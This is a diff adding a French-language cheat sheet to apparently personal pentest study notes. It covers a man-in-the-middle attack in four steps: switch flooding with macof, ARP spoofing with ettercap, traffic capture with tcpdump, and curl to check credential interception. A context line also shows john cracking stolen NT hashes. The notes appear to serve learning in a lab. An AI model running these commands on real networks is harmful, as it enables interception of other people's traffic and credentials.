@@ -130,3 +130,36 @@ Voici l'ordre exact et les commandes utilisées pour compromettre un serveur Win
 - `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` : Lancer l'attaque par dictionnaire sur l'empreinte volée.
 
 ---
+
+## 📝 Fiche Récap : Attaque Man in the Middle (MitM)
+
+L'objectif du MitM ("L'Homme du Milieu") est de se placer entre une victime et le routeur pour intercepter, lire, ou modifier tout le trafic réseau (mots de passe, requêtes, etc.).
+
+### **1. Saturation du Switch (macof)**
+
+- *Concept :* Un switch réseau sécurise le trafic en envoyant les paquets uniquement au bon destinataire. Si on sature sa mémoire de fausses adresses, il panique et se transforme en "Hub" (il envoie tout le trafic à tout le monde).
+- `macof -i eth0` : Inonde le réseau local de milliers d'adresses MAC aléatoires depuis ton interface `eth0`.
+
+### **2. Empoisonnement ARP (ettercap)**
+
+- *Concept :* On ment à la victime en lui disant "Je suis le routeur", et on ment au routeur en lui disant "Je suis la victime". Tout le trafic passera donc par notre machine.
+- `ettercap -G` : Lance Ettercap avec son interface graphique (très visuel pour cibler ses victimes).
+- `ettercap -T -q -i eth0 -M arp:remote /<IP_VICTIME>// /<IP_ROUTEUR>//` : Lance l'attaque silencieusement en ligne de commande.
+  - `-T` : Mode texte.
+  - `-q` : Mode silencieux (quiet).
+  - `-M arp:remote` : Méthode d'attaque (Man in the middle via ARP spoofing).
+
+### **3. Capture du Trafic (tcpdump)**
+
+- *Concept :* Maintenant que le trafic de la victime traverse notre machine, on l'enregistre pour l'analyser.
+- `tcpdump -i eth0` : Écoute et affiche tout le trafic qui passe par la carte réseau `eth0`.
+- `tcpdump -i eth0 -w interception.pcap` : Enregistre silencieusement tout le trafic intercepté dans un fichier `.pcap`. Ce fichier pourra ensuite être ouvert de manière très propre et lisible dans **Wireshark**.
+- `tcpdump -i eth0 port 80` : Filtre pour n'intercepter que le trafic web non sécurisé (HTTP).
+
+### **4. Simulation / Test de la victime (curl)**
+
+- *Concept :* Outil en ligne de commande permettant de simuler un navigateur web (très utile pour générer du trafic et vérifier que notre interception fonctionne).
+- `curl http://site-non-securise.com` : Fait une requête web HTTP simple. Si notre MitM avec `tcpdump` ou `ettercap` tourne à côté, on verra cette requête se faire intercepter en direct !
+- `curl -u utilisateur:motdepasse http://cible.com` : Simule une tentative de connexion pour vérifier si on arrive bien à intercepter les identifiants qui transitent sur le réseau.
+
+---
